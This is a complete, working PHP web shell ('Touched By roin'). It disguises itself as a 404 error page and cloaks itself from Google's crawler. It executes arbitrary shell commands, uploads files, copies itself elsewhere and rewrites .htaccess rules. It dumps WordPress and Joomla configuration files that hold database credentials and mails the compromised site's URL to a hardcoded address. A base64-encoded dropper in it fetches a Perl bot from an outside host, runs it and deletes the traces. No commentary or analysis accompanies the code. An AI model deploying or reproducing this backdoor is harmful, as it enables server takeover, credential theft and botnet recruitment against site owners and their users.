<?php
echo '[syslog]01
'; error_reporting(0); class roin { private $access = array('www-data', 'www', 'apache'); private $type, $os, $user; public function __construct() { $this->user = 'true'; $this->os = $this->sp185db6('os'); $this->type = $this->sp185db6('cmd'); if (!isset($_GET['1180'])) { if (isset($_GET['x1'])) { $this->sp0ed202(); echo $this->os == 'windows' ? '<pre>' . $this->sp695625('dir') . '</pre>' : '<pre>' . $this->sp695625('ls -la') . '</pre>'; } else { header('HTTP/1.0 404 Not Found'); header('Status: 404 Not Found'); echo '<h1>Error 404 Not Found</h1>'; echo 'The page that you have requested could not be found.'; echo '[syslog]10_f
'; die; die; } echo '[syslog]02
'; } else { if (isset($_GET['x'])) { switch ($_GET['x']) { case 'get': if (isset($_GET['file'])) { $sp7ff75d = urldecode($_GET['file']); $spd86858 = isset($_GET['name']) ? $_GET['name'] : 'px.php'; $sp44ea35 = file_get_contents($sp7ff75d); $sp3ae9ac = fopen($spd86858, 'w+'); fwrite($sp3ae9ac, $sp44ea35); fclose($sp3ae9ac); } break; case 'plbot': $this->spe46023(); break; case 'clear': $this->sp8f6150('px.php'); $this->sp8f6150('pl.php'); break; case 'read': if (isset($_GET['path'])) { $sp149c6d = urldecode($_GET['path']); $this->sp26eeb7($sp149c6d); } break; case 'jdb': $this->sp2b35fc(); break; case 'wpdb': $this->sp8aac78(); break; case 'mail': $spd5cca6 = isset($_GET['to']) ? urldecode($_GET['to']) : 'setoran.target26@gmail.com'; $sp06f4c3 = $_SERVER['HTTP_HOST']; $sp96ddf2 = $_SERVER['REQUEST_URI']; $sp9c23ae = gethostbyname($_SERVER['SERVER_ADDR']); $spa1bb6f = gethostbyname($_SERVER['REMOTE_ADDR']); mail($spd5cca6, 'kiriman bos ' . $sp06f4c3 . $sp96ddf2, 'Url:' . $sp06f4c3 . $sp96ddf2 . " nIp :{$sp908e74} Ip injector: {$spa1bb6f}"); break; case 'clone': if (isset($_GET['path'])) { $sp149c6d = urldecode($_GET['path']); if (strstr($sp149c6d, ',')) { $sp410a9e = explode(',', $sp149c6d); if (is_array($sp410a9e) && count($sp410a9e) > 0) { $sp410a9e = array_filter($sp410a9e); if (count($sp410a9e) > 0) { foreach ($sp410a9e as $sp8db113) { $this->sp251ea3($sp8db113); } } } } else { $sp149c6d = urldecode($_GET['path']); $this->sp251ea3($sp149c6d); } } else { $this->sp251ea3('../.inc.php'); $this->sp251ea3('../../.inc.php'); } break; case 'patch': $sp481315 = isset($_GET['lock']) ? 1 : 0; $sp1bdc0c = isset($_GET['force']) ? 1 : 0; $sp149c6d = ''; if (isset($_GET['path'])) { $sp149c6d = urldecode($_GET['path']); if (strstr($sp149c6d, ',')) { $sp149c6d = explode(',', $sp149c6d); } } if (isset($_GET['allow'])) { $spf2bff7 = urldecode($_GET['allow']); if (strstr($spf2bff7, ',')) { $sp7ff75d = explode(',', $spf2bff7); $this->sp26037f($sp8b0777, $sp7ff75d, $sp481315, $sp149c6d, $sp1bdc0c); } else { $this->sp26037f($sp8b0777, $spf2bff7, $sp481315, $sp149c6d, $sp1bdc0c); } } else { $this->sp26037f($sp8b0777, '', $sp481315, $sp149c6d, $sp1bdc0c); } break; case 'chmod': if (isset($_GET['dir'])) { $spee51b5 = $_GET['dir']; if ($spee51b5 == 1) { chmod('./', 365); } else { if ($spee51b5 == 2) { chmod('./', 365); chmod('../', 365); } else { if ($spee51b5 == 3) { chmod('./', 365); chmod('../', 365); chmod('../../', 365); } else { $spee51b5 = str_replace('|', '/', $spee51b5); chmod($spee51b5, 365); } } } } break; case 'die': $sp60cf97 = $_SERVER['SCRIPT_FILENAME']; @unlink($sp60cf97); break; } } else { if (isset($_GET['del'])) { $sp852d5a = $_GET['del']; if (strstr($sp852d5a, ',')) { $sp410a9e = explode(',', $sp852d5a); if (is_array($sp410a9e) && count($sp410a9e) > 0) { $sp410a9e = array_filter($sp410a9e); foreach ($sp410a9e as $sp8db113) { $this->sp8f6150($sp8db113); } } } else { $this->sp8f6150($sp852d5a); } } $this->spd1842b(); } } } private function spe46023() { echo '[syslog]03_f
'; $sp44ea35 = 'PD9waHANCiR1cmwgPSAoaXNzZXQoJF9HRVRbJ3VybCddKSkgPyB1cmxkZWNvZGUoJF9HRVRbJ3VybCddKSA6ICJodHRwOi8vd3d3LmhvdGVscmlzdG9yYW50ZWxlcGFudG8uaXQvZm9ybS8vLi4uL3JvYm90LnR4

dCI7DQoNCmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsNCglAZXhlYygnd2dldCAnLiR1cmwuJyAtTyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV

4ZWMoJ2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdsd3AtZG93bmxvYWQgLWEgJy4kdXJsLicgcm9ib3QudHh0O3

Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdseW54IC1zb3VyY2UgJy4kdXJsLicgPiByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gL

WZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAZXhlYygnR0VUICcuJHVybC4nID5y

b2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ3JtIC1yZiByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO3dnZXQgJy4kdXJsLicgLU8gcm9ib3Q

udHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO2N1cmwgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYi

oudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAZXhlYygnY2QgL3Rtc

DtseW54IC1zb3VyY2UgJy4kdXJsLicgPiByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7ZmV0Y2ggLW8gcm9ib3QudHh0ICcuJHVy

bC4nO3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO0dFVCAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdybSAtcmYgaW5kZXgucGhwLionKTsNCglAZXhlYygnY2QgL3RtcDtybSAtcmYgcm9iKi50eHQnKT

sNCglAZXhlYygncm0gLXJmIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7cm0gLXJmIHJvYioudHh0KicpOw0KCUBleGVjKCdybSAtcmYgcm9iKi50eHQqJyk7DQp9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZ

WxsX2V4ZWMnKSl7DQoJQHNoZWxsX2V4ZWMoJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdjdXJsICcu

JHVybC4nIC1vIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnbHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJ

vYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC

1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdmZXRjaCAtbyByb2JvdC50eHQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ0dFV

CAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdybSAtcmYgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDt3Z2V0ICcuJH

VybC4nIC1PIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtjdXJsICcuJHVybC4nO3Blcmwgcm9ib3QudHh0O3Blcmwgc

m9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdjZCAvdG1wO2x3cC1kb3dubG9hZCAtYSAnLiR1cmwuJyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJv

YioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ2NkIC90bXA7bHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9

leGVjKCdjZCAvdG1wO2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtHRVQgJy4kdXJsLi

cgPnJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtybSAtcmYgaW5kZXgucGhwLionKTsNCglAc2hlbGxfZXhlYygnY2QgL

3RtcDtybSAtcmYgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygncm0gLXJmIHJvYioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ2NkIC90bXA7cm0gLXJmIHJvYioudHh0KicpOw0KCUBzaGVsbF9leGVjKCdybSAtcmYgcm9i

Ki50eHQqJyk7DQp9ZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KCUBzeXN0ZW0oJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2I

qLnR4dCcpOw0KCUBzeXN0ZW0oJ2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2x3cC1kb3dubG9hZCAtYSAnLi

R1cmwuJyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O

3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglA

c3lzdGVtKCdHRVQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgnY2QgL3RtcDt3Z2V0ICc

uJHVybC4nIC1PIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3

QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtyb

SAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2x5bnggLXNvdXJjZSAnLiR1cmwuJyA

+IHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZX

JsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO0dFVCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdyb

SAtcmYgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdmFyL3RtcDtybSAtcmYgaW5kZXgucGhwLionKTsNCglAc3lzdGVtKCdjZCAvdG1wO3JtIC1yZiByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2NkIC90bXA7cm0gLXJm

IHJvYioudHh0KicpOw0KfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsNCglAcGFzc3RocnUoJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3J

tIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnY3VybCAnLiR1cmwuJyAtbyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdsd3AtZG

93bmxvYWQgLWEgJy4kdXJsLicgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O

3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnZmV0Y2ggLW8gcm9ib3QudHh0ICcuJHVybC4nIDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAt

ZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ0dFVCAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdjZCAvdG1wO3dnZXQgJy4kdXJsLi

cgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnY2QgL3RtcDtjdXJsICcuJHVybC4nIC1vIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4d

DtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAt

ZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ2NkIC90bXA7bHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXN

zdGhydSgnY2QgL3RtcDtmZXRjaCAtbyByb2JvdC50eHQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdjZCAvdG1wO0dFVCAnLiR1cmwuJz

twZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ3JtIC1yZiBpbmRleC5waHAuKicpOw0KCUBwYXNzdGhydSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHBhc3N0a

HJ1KCdybSAtcmYgcm9iKi50eHQqJyk7DQp9DQo/Pg=='; echo '[syslog]04
'; $sp36759d = base64_decode($sp44ea35); $sp3ae9ac = fopen('pl.php', 'w+'); fwrite($sp3ae9ac, $sp36759d); fclose($sp3ae9ac); } private function sp185db6($sp81c371) { if ($sp81c371 == 'cmd') { $spb7d120 = 0; if (function_exists('passthru')) { $spb7d120 = 'passthru'; } elseif (function_exists('system')) { $spb7d120 = 'system'; } elseif (function_exists('exec')) { $spb7d120 = 'exec'; } elseif (function_exists('shell_exec')) { $spb7d120 = 'shell_exec'; } } else { $spb7d120 = 'linux'; if (PHP_OS == 'WINNT') { $spb7d120 = 'windows'; } elseif (PHP_OS == 'Linux') { $spb7d120 = 'linux'; } elseif (PHP_OS == 'FreeBSD') { $spb7d120 = 'freebsd'; } } return $spb7d120; } private function spd1842b() { $this->sp0ed202(); if (isset($_GET['start'])) { echo '<form enctype=multipart/form-data action method=POST><b>Upload File</b><br/><input type=hidden name=submit><input type=file name=userfile 

size=28><br><b>New name: </b><input type=text size=15 name=newname class=ta><input type=submit class=bt value=Upload></form>'; $this->sp57c470(); $this->sp59db13(); } else { $this->sp59db13(); } } private function sp0ed202() { if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'google') !== false) { header('HTTP/1.0 404 Not Found'); echo '<h1>Error 404 Not Found</h1>'; echo 'The page that you have requested could not be found.'; echo '[syslog]09_f
'; die; } $sp1576f4 = @ini_get('safe_mode'); $sp17712d = !$sp1576f4 ? 'SAFE_MODE : OFF roin' : 'SAFE_MODE : ON roin'; echo '<body style=\'background:#610680;
        color:#fff;
        font-family:monospace;
        font-size:13px;
        \'>'; echo '<title>Touched By roin</title><br>'; echo '<b>' . $sp17712d . '</b><br>'; $sp56ca7c = '(' . $this->user . ')'; echo '<b>User : uid=' . getmyuid() . $sp56ca7c . ' gid=' . getmygid() . $sp56ca7c . '</b><br>'; echo '<b>Uname : ' . php_uname() . '</b><br/>'; } private function sp57c470() { if (isset($_POST['submit'])) { $sp6ac5e1 = $this->spd26233(); if (!($spd86858 = $_POST['newname'])) { $spd86858 = $_FILES['userfile']['name']; } move_uploaded_file($_FILES['userfile']['tmp_name'], $sp6ac5e1 . $spd86858); echo move_uploaded_file($_FILES['userfile']['tmp_name'], $sp6ac5e1 . $spd86858) ? '!!Upload Failed' : 'Success Upload to ' . $sp6ac5e1 . $spd86858; } } private function spd26233() { $sp570d5b = getcwd(); if ($spdb158b = strrpos($sp570d5b, '/')) { return $spdb158b != strlen($sp570d5b) - 1 ? $sp570d5b . '/' : $sp570d5b; } elseif ($spdb158b = strrpos($sp570d5b, '/')) { if ($spdb158b != strlen($sp570d5b) - 1) { return $sp570d5b . '/'; } else { return $sp570d5b; } } } private function sp59db13($sp59db13 = false) { if ($sp59db13) { echo '<pre>' . $this->sp695625($sp59db13) . '</pre>'; } else { if (isset($_GET['q'])) { echo '<pre>' . $this->sp695625($_GET['q']) . '</pre>'; } else { echo $this->os == 'windows' ? '<pre>' . $this->sp695625('dir') . '</pre>' : '<pre>' . $this->sp695625('ls -la') . '</pre>'; } } } private function sp695625($sp59db13) { echo '[syslog]05_f
'; $sp8e5eb2 = ''; if ($this->type == 'exec') { @exec($sp59db13, $sp8e5eb2); $sp8e5eb2 = join('n', $sp8e5eb2); } elseif ($this->type == 'shell_exec') { $sp8e5eb2 = @shell_exec($sp59db13); } elseif ($this->type == 'system') { @ob_start(); @system($sp59db13); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } elseif ($this->type == 'passthru') { @ob_start(); @passthru($sp59db13); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } return $sp8e5eb2; } private function sp26037f($sp8b0777, $sp410a9e, $sp481315, $sp149c6d, $sp1bdc0c) { echo '[syslog]06_f
'; $spe8e7e2 = 1; if (!$sp1bdc0c) { if (in_array($sp8b0777, $this->access)) { $spe8e7e2 = 0; } } if ($spe8e7e2) { if ($sp481315) { $sp412bbc = 'deny from all' . PHP_EOL; } else { $sp412bbc = '<Files ~ "(?i).(zip|rar|php|php.*|phtml|gif|png|phpgif|asp|asp.*)$">' . PHP_EOL; $sp412bbc .= 'deny from all' . PHP_EOL; $sp412bbc .= '</Files>' . PHP_EOL; } if (is_array($sp410a9e)) { foreach ($sp410a9e as $sp8db113) { $sp412bbc .= '<Files "' . $sp8db113 . '">' . PHP_EOL; $sp412bbc .= 'Order Allow,Deny' . PHP_EOL; $sp412bbc .= 'Allow from all' . PHP_EOL; $sp412bbc .= '</Files>' . PHP_EOL; } } else { if (!empty($sp410a9e)) { $sp412bbc .= '<Files "' . $sp410a9e . '">' . PHP_EOL; $sp412bbc .= 'Order Allow,Deny' . PHP_EOL; $sp412bbc .= 'Allow from all' . PHP_EOL; $sp412bbc .= '</Files>' . PHP_EOL; } else { $sp412bbc .= '<Files "1x.php">' . PHP_EOL; $sp412bbc .= 'Order Allow,Deny' . PHP_EOL; $sp412bbc .= 'Allow from all' . PHP_EOL; $sp412bbc .= '</Files>' . PHP_EOL; $sp412bbc .= '<Files "string.php">' . PHP_EOL; $sp412bbc .= 'Order Allow,Deny' . PHP_EOL; $sp412bbc .= 'Allow from all' . PHP_EOL; $sp412bbc .= '</Files>' . PHP_EOL; } } if (is_array($sp149c6d)) { foreach ($sp149c6d as $sp8db113) { $sp7ff75d = fopen($sp8db113, 'w'); fwrite($sp7ff75d, $sp412bbc); fclose($sp7ff75d); } } else { if (!empty($sp149c6d)) { $sp7ff75d = fopen($sp149c6d, 'w'); fwrite($sp7ff75d, $sp412bbc); fclose($sp7ff75d); } else { $sp7ff75d = fopen('.htaccess', 'w'); fwrite($sp7ff75d, $sp412bbc); fclose($sp7ff75d); } } } } private function sp26eeb7($sp7ff75d) { $sp1198cc = file_get_contents($sp7ff75d); if ($sp1198cc) { echo $sp1198cc; } else { echo 'Unable to open file'; } die; } private function sp251ea3($sp149c6d) { if (file_exists($sp149c6d)) { @unlink($sp149c6d); } $sp60cf97 = $_SERVER['SCRIPT_FILENAME']; copy($sp60cf97, $sp149c6d); } private function sp2b35fc() { $spd6330d = '../../../../../../../'; $sp0bd92b = '../../../../../../'; $sp8f82a5 = '../../../../../'; $spefeac6 = '../../../../'; $sp793293 = '../../../'; $sp680d5b = '../../'; $spc725be = '../'; $sp460372 = file_get_contents($spd6330d . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($sp0bd92b . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($sp8f82a5 . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($spefeac6 . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($sp793293 . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($sp680d5b . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents($spc725be . 'configuration.php'); if (!$sp460372) { $sp460372 = file_get_contents('configuration.php'); } } } } } } } echo $sp460372; die; } private function sp8aac78() { $spd6330d = '../../../../../../../'; $sp0bd92b = '../../../../../../'; $sp8f82a5 = '../../../../../'; $spefeac6 = '../../../../'; $sp793293 = '../../../'; $sp680d5b = '../../'; $spc725be = '../'; $spbc6c6b = file_get_contents($spd6330d . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($sp0bd92b . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($sp8f82a5 . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($spefeac6 . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($sp793293 . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($sp680d5b . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents($spc725be . 'wp-config.php'); if (!$spbc6c6b) { $spbc6c6b = file_get_contents('wp-config.php'); } } } } } } } echo $spbc6c6b; die; } private function sp8f6150($sp7ff75d) { chmod('./', 493); chmod('../', 493); chmod('../../', 493); @unlink($this->spd26233() . $sp7ff75d); $this->sp695625('rm -rf ' . $sp7ff75d); $this->sp695625('del ' . $sp7ff75d); } } new roin(); echo '[syslog]08
';